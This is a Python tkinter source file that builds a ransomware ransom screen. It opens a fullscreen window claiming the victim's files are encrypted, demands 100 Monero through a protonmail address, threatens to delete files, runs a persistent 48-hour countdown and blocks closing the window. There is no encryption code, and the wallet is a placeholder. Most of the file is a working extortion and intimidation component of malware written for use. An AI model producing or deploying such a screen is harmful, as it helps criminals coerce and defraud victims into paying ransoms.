# Author: SergioZ3R0
import tkinter as tk
from tkinter import messagebox
from tkinter import PhotoImage
import time
import threading
import os
import webbrowser

class Window:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("DarthVader")
        self.root.geometry("800x600")  # Aumentar el tamaño de la ventana
        self.root.configure(bg="black")
        self.root.attributes("-fullscreen", True)  # Configurar la ventana en pantalla completa
        self.create_widgets()
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        self.thread = threading.Thread(target=self.countdown)
        self.thread.start()
        self.root.mainloop()

    def create_widgets(self):
        logo_path = "logo.png"
        if os.path.exists(logo_path):
            self.logo = PhotoImage(file=logo_path)
        else:
            self.logo = None  # Fallback if logo.png is not found

        # Frame for the left side
        left_frame = tk.Frame(self.root, bg="black")
        left_frame.grid(row=0, column=0, padx=20, pady=20, sticky="nsew")

        self.logo_label = tk.Label(left_frame, image=self.logo, bg="black")
        self.logo_label.grid(row=0, column=0, pady=10, sticky="nsew")

        self.title_label = tk.Label(left_frame, text="Ooops, your files have been encrypted!", font=("Helvetica", 16, "bold"), fg="red", bg="black")
        self.title_label.grid(row=1, column=0, pady=10, sticky="nsew")

        self.message_label = tk.Label(left_frame, text=(
            "The harddisks of your computer have been encrypted with a Military grade encryption algorithm.\n"
            "There is no way to restore your data without a special key.\n"
            "Only we can decrypt your files!\n\n"
            "To purchase your key and restore your data, please follow these three easy steps:\n\n"
            "1. Email the file called EMAIL_ME.txt at {self.sysRoot}Desktop/EMAIL_ME.txt to GetYourFilesBack@protonmail.com\n\n"
            "2. You will receive your personal Monero (XMR) address for payment.\n"
            "   Once payment has been completed, send another email to GetYourFilesBack@protonmail.com stating 'PAID'.\n"
            "   We will check to see if payment has been paid.\n\n"
            "3. You will receive a text file with your KEY that will unlock all your files.\n"
            "   IMPORTANT: To decrypt your files, place text file on desktop and wait. Shortly after it will begin to decrypt all files.\n\n"
            "WARNING:\n"
            "Do NOT attempt to decrypt your files with any software as it is obsolete and will not work, and may cost you more to unlock your files.\n"
            "Do NOT change file names, mess with the files, or run decryption software as it will cost you more to unlock your files-\n"
            "-and there is a high chance you will lose your files forever.\n"
            "Do NOT send 'PAID' button without paying, price WILL go up for disobedience.\n"
            "Do NOT think that we won't delete your files altogether and throw away the key if you refuse to pay. WE WILL."
        ), justify="left", fg="white", bg="black")
        self.message_label.grid(row=2, column=0, pady=10, sticky="nsew")

        self.time_label = tk.Label(left_frame, text="Tiempo restante: 48:00:00", font=("Helvetica", 14), fg="yellow", bg="black")
        self.time_label.grid(row=3, column=0, pady=10, sticky="nsew")

        self.pay_button = tk.Button(left_frame, text="Pay Now", command=self.pay_now, font=("Helvetica", 14), bg="red", fg="white")
        self.pay_button.grid(row=4, column=0, pady=20, sticky="nsew")

        self.instructions = tk.Text(left_frame, height=5, width=50, bg="black", fg="white", font=("Helvetica", 12), wrap=tk.WORD)
        self.instructions.insert(tk.END, "Instructions:\n1. Go to https://crypto.com\n2. Pay 100 Monero (XMR) to the wallet address WALLET\n3. After payment, you will receive the decryption key.")
        self.instructions.config(state=tk.DISABLED)
        self.instructions.grid(row=5, column=0, pady=10, sticky="nsew")

        # Frame for the right side
        right_frame = tk.Frame(self.root, bg="black")
        right_frame.grid(row=0, column=1, padx=20, pady=20, sticky="nsew")

        self.description_label = tk.Label(right_frame, text="What is Ransomware?", font=("Helvetica", 14, "bold"), fg="white", bg="black")
        self.description_label.grid(row=0, column=0, pady=10, sticky="nsew")

        self.description_text = tk.Text(right_frame, height=15, width=40, bg="black", fg="white", font=("Helvetica", 12), wrap=tk.WORD)
        self.description_text.insert(tk.END, "Ransomware is a type of malicious software designed to block access to a computer system until a sum of money is paid. It typically spreads through phishing emails or by exploiting vulnerabilities in software. Once a system is infected, the ransomware encrypts files and demands a ransom to restore access.")
        self.description_text.config(state=tk.DISABLED)
        self.description_text.grid(row=1, column=0, pady=10, sticky="nsew")

        self.root.grid_columnconfigure(0, weight=1)
        self.root.grid_columnconfigure(1, weight=1)
        self.root.grid_rowconfigure(0, weight=1)

    def countdown(self):
        total_seconds = self.load_time_remaining()
        while total_seconds > 0:
            hours, remainder = divmod(total_seconds, 3600)
            minutes, seconds = divmod(remainder, 60)
            time_format = f"{hours:02}:{minutes:02}:{seconds:02}"
            self.time_label.config(text=f"Tiempo restante: {time_format}")
            self.root.update()
            time.sleep(1)
            total_seconds -= 1
            self.save_time_remaining(total_seconds)
        self.on_closing()

    def load_time_remaining(self):
        if os.path.exists("time_remaining.txt"):
            with open("time_remaining.txt", "r") as file:
                return int(file.read().strip())
        else:
            return 48 * 60 * 60

    def save_time_remaining(self, total_seconds):
        with open("time_remaining.txt", "w") as file:
            file.write(str(total_seconds))

    def pay_now(self):
        webbrowser.open("https://crypto.com")
        messagebox.showinfo("Payment", "Pay 100 Monero (XMR) to my wallet (WALLET) to decrypt your files")

    def on_closing(self):
        if messagebox.askokcancel("Salir", "You can't close the window. You need to pay to decrypt your files."):
            pass

if __name__ == "__main__":
    window = Window()
